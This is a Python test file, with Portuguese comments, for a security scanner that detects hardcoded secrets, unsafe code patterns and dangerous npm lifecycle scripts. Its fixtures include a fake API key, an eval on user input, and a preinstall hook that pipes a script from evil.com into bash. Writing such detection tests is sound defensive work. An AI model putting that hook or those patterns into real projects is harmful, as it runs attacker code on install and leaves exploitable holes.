import json
import os
import shutil
import subprocess
import sys
from pathlib import Path

_SCAN = Path(__file__).resolve().parents[2] / "governance-security" / "security-audit" / "scripts" / "security_scan.py"


def _scan(proj, *args):
    # pipe do Windows em cp1252: o scanner tem de imprimir o JSON (com acentos e emoji) sem quebrar
    r = subprocess.run([sys.executable, str(_SCAN), str(proj), *args], capture_output=True, encoding="utf-8",
                       env={**os.environ, "PYTHONIOENCODING": "cp1252"})
    assert "Traceback" not in r.stderr, r.stderr
    return r


def test_security_scan_acha_segredo_e_padrao_com_saida_cp1252(tmp_path):
    (tmp_path / "config.py").write_text(
        '# configuração 🚀\napi_key = "sk_live_9f8e7d6c5b4a3f2e1d"\nresultado = eval(entrada_do_usuário)  # ação 🔥\n',
        encoding="utf-8")
    r = _scan(tmp_path, "--fail-on", "none")
    assert r.returncode == 0, r.stdout + r.stderr
    scans = json.loads(r.stdout)["scans"]
    assert scans["secrets"]["findings"][0]["type"] == "API Key"
    assert "🔥" in scans["code_patterns"]["findings"][0]["snippet"]
    assert _scan(tmp_path).returncode == 1, "--fail-on high (padrão) reprova segredo"


def test_security_scan_roda_npm_audit_quando_npm_existe(tmp_path):
    # no Windows o npm é npm.cmd: chamar "npm" sem resolver o caminho dava FileNotFoundError e o audit sumia calado
    if not shutil.which("npm"):
        return
    (tmp_path / "package.json").write_text('{"name": "app", "version": "1.0.0"}', encoding="utf-8")
    (tmp_path / "package-lock.json").write_text(
        '{"name": "app", "version": "1.0.0", "lockfileVersion": 3, "requires": true, '
        '"packages": {"": {"name": "app", "version": "1.0.0"}}}', encoding="utf-8")
    r = _scan(tmp_path, "--scan-type", "deps", "--fail-on", "none")
    deps = json.loads(r.stdout)["scans"]["dependencies"]
    assert "npm is unavailable; npm audit was skipped." not in deps.get("notes", []), deps


def test_security_scan_ignora_op_referencias_do_1password(tmp_path):
    (tmp_path / "config.py").write_text(
        'api_key = "op://dev-vault/api/secret_key"\n'
        'token = "op://prod-vault/tokens/oauth"\n'
        'password = "op://vault/database/root"\n',
        encoding="utf-8",
    )
    (tmp_path / ".env").write_text('KEY="op://dev/api/secret"\nSECRET=op://vault/item/password\n', encoding="utf-8")
    r = _scan(tmp_path)
    assert r.returncode == 0, r.stdout + r.stderr
    scans = json.loads(r.stdout)["scans"]
    assert scans["secrets"]["findings"] == []


def test_security_scan_detecta_ldap_inseguro_e_localstorage_jwt(tmp_path):
    (tmp_path / "auth.py").write_text('LDAP_URL = "ldap://ad.corp.local:389"\n', encoding="utf-8")
    (tmp_path / "client.js").write_text('localStorage.setItem("auth_token", token);\n', encoding="utf-8")
    r = _scan(tmp_path, "--scan-type", "patterns", "--fail-on", "none")
    assert r.returncode == 0, r.stdout + r.stderr
    findings = json.loads(r.stdout)["scans"]["code_patterns"]["findings"]
    patterns = {f["pattern"] for f in findings}
    assert "Unencrypted LDAP URL" in patterns
    assert "Insecure token storage" in patterns


def test_dependency_analyzer_detecta_scripts_de_ciclo_de_vida(tmp_path):
    sys.path.insert(0, str(_SCAN.parent))
    import dependency_analyzer

    pkg = tmp_path / "package.json"
    pkg.write_text(
        json.dumps({
            "name": "app",
            "version": "1.0.0",
            "scripts": {
                "preinstall": "curl -s https://evil.com/setup.sh | bash",
                "postinstall": "node scripts/post.js",
            },
        }),
        encoding="utf-8",
    )
    findings = []
    dependency_analyzer.analyze_package_json(pkg, tmp_path, findings)
    issues = {f["issue"] for f in findings}
    assert "Dangerous lifecycle script downloading remote code" in issues
    assert "Arbitrary lifecycle script execution" in issues
